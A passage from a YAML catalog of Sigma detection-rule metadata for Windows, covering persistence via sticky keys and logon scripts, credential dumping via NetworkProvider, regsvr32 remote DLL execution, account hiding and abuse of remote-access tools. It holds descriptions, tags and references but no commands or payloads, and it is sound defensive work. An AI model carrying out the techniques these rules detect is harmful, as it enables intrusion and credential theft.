  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.008
  time_window: ''
  references:
  - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/
  - https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 21d856f9-9281-4ded-9377-51a1a6e2a432
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_logon_script.yml
  name: Potential Persistence Via Logon Scripts - CommandLine
  description: Detects the addition of a new LogonScript to the registry value "UserInitMprLogonScript"
    for potential persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1037.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1037.001
  time_window: ''
  references:
  - https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html
  false_positives:
  - Legitimate addition of Logon Scripts via the command line by administrators or
    third party tools
  notes: ''
- detection_id: baef1ec6-2ca9-47a3-97cc-4cf2bda10b77
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_new_network_provider.yml
  name: Potential Credential Dumping Attempt Using New NetworkProvider - CLI
  description: Detects when an attacker tries to add a new network provider in order
    to dump clear text credentials, similar to how the NPPSpy tool does it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/network-provider-settings-removed-in-place-upgrade
  - https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
  false_positives:
  - Other legitimate network providers used and not filtred in this rule
  notes: ''
- detection_id: 023c654f-8f16-44d9-bb2b-00ff36a62af9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_office_disable_python_security_warnings.yml
  name: Python Function Execution Security Warning Disabled In Excel
  description: 'Detects changes to the registry value "PythonFunctionWarnings" that
    would prevent any warnings or alerts from showing when Python functions are about
    to be executed.

    Threat actors could run malicious code through the new Microsoft Excel feature
    that allows Python to run within the spreadsheet.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/office/data-security-and-python-in-excel-33cc88a4-4a87-485e-9ff9-f35958278327
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_privilege_escalation_via_service_key.yml
  name: Potential Privilege Escalation via Service Permissions Weakness
  description: Detect modification of services configuration (ImagePath, FailureCommand
    and ServiceDLL) in registry by processes with Medium integrity level
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_provlaunch_provisioning_command.yml
  name: Potential Provisioning Registry Key Abuse For Binary Proxy Execution
  description: Detects potential abuse of the provisioning registry key for indirect
    command execution through "Provlaunch.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
  - https://twitter.com/0gtweet/status/1674399582162153472
  false_positives:
  - Unknown
  notes: ''
- detection_id: cf2e938e-9a3e-4fe8-a347-411642b28a9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_set_unsecure_powershell_policy.yml
  name: Potential PowerShell Execution Policy Tampering - ProcCreation
  description: Detects changes to the PowerShell execution policy registry key in
    order to bypass signing requirements for script execution from the CommandLine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/de-de/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.3
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9ec9fb1b-e059-4489-9642-f270c207923d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_special_accounts_hide_user.yml
  name: Hiding User Account Via SpecialAccounts Registry Key - CommandLine
  description: 'Detects changes to the registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to
    "0" in order to hide user account from being listed on the logon screen.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.002
  tags:
  - attack.defense-evasion
  - attack.t1564.002
  time_window: ''
  references:
  - https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
  - https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/
  - https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - System administrator activities
  notes: ''
- detection_id: ec88289a-7e1a-4cc3-8d18-bd1f60e4b9ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_typed_paths_persistence.yml
  name: Persistence Via TypedPaths - CommandLine
  description: Detects modification addition to the 'TypedPaths' key in the user or
    admin registry via the commandline. Which might indicate persistence attempt
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://twitter.com/dez_/status/1560101453150257154
  - https://forensafe.com/blogs/typedpaths.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b236190c-1c61-41e9-84b3-3fe03f6d76b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml
  name: Potential Regsvr32 Commandline Flag Anomaly
  description: Detects a potential command line flag anomaly related to "regsvr32"
    in which the "/i" flag is used without the "/n" which should be uncommon.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1282441816986484737?s=12
  false_positives:
  - Administrator typo might cause some false positives
  notes: ''
- detection_id: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml
  name: Potentially Suspicious Regsvr32 HTTP IP Pattern
  description: Detects regsvr32 execution to download and install DLLs located remotely
    where the address is an IP address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1461041276514623491
  - https://twitter.com/tccontre18/status/1480950986650832903
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  false_positives:
  - FQDNs that start with a number such as "7-Zip"
  notes: ''
- detection_id: 867356ee-9352-41c9-a8f2-1be690d78216
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
  name: Potentially Suspicious Regsvr32 HTTP/FTP Pattern
  description: Detects regsvr32 execution to download/install/register new DLLs that
    are hosted on Web or FTP servers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1461041276514623491
  - https://twitter.com/tccontre18/status/1480950986650832903
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88a87a10-384b-4ad7-8871-2f9bf9259ce5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_remote_share.yml
  name: Suspicious Regsvr32 Execution From Remote Share
  description: Detects REGSVR32.exe to execute DLL hosted on remote shares
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml
  name: Potentially Suspicious Child Process Of Regsvr32
  description: Detects potentially suspicious child processes of "regsvr32.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-april-2022/
  - https://www.echotrail.io/insights/search/regsvr32.exe
  - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo
  false_positives:
  - Unlikely, but can rarely occur. Apply additional filters accordingly.
  notes: ''
- detection_id: 9525dc73-0327-438c-8c04-13c0e037e9da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml
  name: Regsvr32 Execution From Potential Suspicious Location
  description: Detects execution of regsvr32 where the DLL is located in a potentially
    suspicious location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html
  - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/
  false_positives:
  - Some installers might execute "regsvr32" with DLLs located in %TEMP% or in %PROGRAMDATA%.
    Apply additional filters if necessary.
  notes: ''
- detection_id: 327ff235-94eb-4f06-b9de-aaee571324be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_2.yml
  name: Regsvr32 Execution From Highly Suspicious Location
  description: Detects execution of regsvr32 where the DLL is located in a highly
    suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_susp_extensions.yml
  name: Regsvr32 DLL Execution With Suspicious File Extension
  description: Detects the execution of REGSVR32.exe with DLL files masquerading as
    other files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/
  - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html
  - https://guides.lib.umich.edu/c.php?g=282942&p=1885348
  - https://harfanglab.io/insidethelab/uac-0057-pressure-ukraine-poland/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ab37a6ec-6068-432b-a64e-2c7bf95b1d22
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml
  name: Scripting/CommandLine Process Spawned Regsvr32
  description: Detects various command line and scripting engines/processes such as
    "PowerShell", "Wscript", "Cmd", etc. spawning a "regsvr32" instance.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html
  - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/
  false_positives:
  - Legitimate ".bat", ".hta", ".ps1" or ".vbs" scripts leverage legitimately often.
    Apply additional filter and exclusions as necessary
  - Some legitimate Windows services
  notes: ''
- detection_id: 50919691-7302-437f-8e10-1fe088afa145
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regsvr32_uncommon_extension.yml
  name: Regsvr32 DLL Execution With Uncommon Extension
  description: Detects a "regsvr32" execution where the DLL doesn't contain a common
    file extension.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574
  - attack.execution
  time_window: ''
  references:
  - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/
  false_positives:
  - Other legitimate extensions currently not in the list either from third party
    or specific Windows components.
  notes: ''
- detection_id: b52e84a3-029e-4529-b09b-71d19dd27e94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_anydesk.yml
  name: Remote Access Tool - AnyDesk Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: b1377339-fda6-477a-b455-ac0923f9ec2c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli.yml
  name: Remote Access Tool - AnyDesk Piped Password Via CLI
  description: Detects piping the password to an anydesk instance via CMD and the
    '--set-password' flag.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Legitimate piping of the password to anydesk
  - Some FP could occur with similar tools that uses the same command line '--set-password'
  notes: ''
- detection_id: 41f407b5-3096-44ea-a74f-96d04fbc41be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_anydesk_revoked_cert.yml
  name: Remote Access Tool - AnyDesk Execution With Known Revoked Signing Certificate
  description: 'Detects the execution of an AnyDesk binary with a version prior to
    8.0.8.

    Prior to version 8.0.8, the Anydesk application used a signing certificate that
    got compromised by threat actors.

    Use this rule to detect instances of older versions of Anydesk using the compromised
    certificate

    This is recommended in order to avoid attackers leveraging the certificate and
    signing their binaries to bypass detections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.initial-access
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/anydesk-says-hackers-breached-its-production-servers-reset-passwords/
  - https://anydesk.com/en/changelog/windows
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 114e7f1c-f137-48c8-8f54-3088c24ce4b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_anydesk_silent_install.yml
  name: Remote Access Tool - AnyDesk Silent Installation
  description: Detects AnyDesk Remote Desktop silent installation. Which can be used
    by attackers to gain remote access.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20
  - https://support.anydesk.com/Automatic_Deployment
  false_positives:
  - Legitimate deployment of AnyDesk
  notes: ''
- detection_id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_anydesk_susp_exec.yml
  name: Remote Access Tool - Anydesk Execution From Suspicious Folder
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  false_positives:
  - Legitimate use of AnyDesk from a non-standard folder
  notes: ''
- detection_id: b6d98a4f-cef0-4abf-bbf6-24132854a83d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_gotoopener.yml
  name: Remote Access Tool - GoToAssist Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: d85873ef-a0f8-4c48-a53a-6b621f11729d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_logmein.yml
  name: Remote Access Tool - LogMeIn Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 2fbbe9ff-0afc-470b-bdc0-592198339968
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_meshagent_arguments.yml
  name: Remote Access Tool - Potential MeshAgent Execution - Windows
  description: 'Detects potential execution of MeshAgent which is a tool used for
    remote access.

    Historical data shows that threat actors rename MeshAgent binary to evade detection.

    Matching command lines with the ''--meshServiceName'' argument can indicate that
    the MeshAgent is being used for remote access.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.huntress.com/blog/know-thy-enemy-a-novel-november-case-on-persistent-remote-access
  - https://thecyberexpress.com/ukraine-hit-by-meshagent-malware-campaign/
  - https://wazuh.com/blog/how-to-detect-meshagent-with-wazuh/
  - https://www.security.com/threat-intelligence/medusa-ransomware-attacks
  false_positives:
  - Environments that legitimately use MeshAgent
  notes: ''
- detection_id: 74a2b202-73e0-4693-9a3a-9d36146d0775
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_meshagent_exec.yml
  name: Remote Access Tool - MeshAgent Command Execution via MeshCentral
  description: 'Detects the use of MeshAgent to execute commands on the target host,
    particularly when threat actors might abuse it to execute commands directly.

    MeshAgent can execute commands on the target host by leveraging win-console to
    obscure their activities and win-dispatcher to run malicious code through IPC
    with child processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/Ylianst/MeshAgent
  - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-dispatcher.js#L173
  - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-info.js#L55
  false_positives:
  - False positives can be found in environments using MeshAgent for remote management,
    analysis should prioritize the grandparent process, MeshAgent.exe, and scrutinize
    the resulting child processes triggered by any suspicious interactive commands
    directed at the target host.
  notes: ''
- detection_id: 758ff488-18d5-4cbe-8ec4-02b6285a434f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_netsupport.yml
  name: Remote Access Tool - NetSupport Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 37e8d358-6408-4853-82f4-98333fca7014
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_netsupport_susp_exec.yml
  name: Remote Access Tool - NetSupport Execution From Unusual Location
  description: Detects execution of client32.exe (NetSupport RAT) from an unusual
    location (outside of 'C:\Program Files')
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b471f462-eb0d-4832-be35-28d94bdb4780
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_renamed_meshagent_execution.yml
  name: Remote Access Tool - Renamed MeshAgent Execution - Windows
  description: 'Detects the execution of a renamed instance of the Remote Monitoring
    and Management (RMM) tool, MeshAgent.

    RMM tools such as MeshAgent are commonly utilized by IT administrators for legitimate
    remote support and system management.

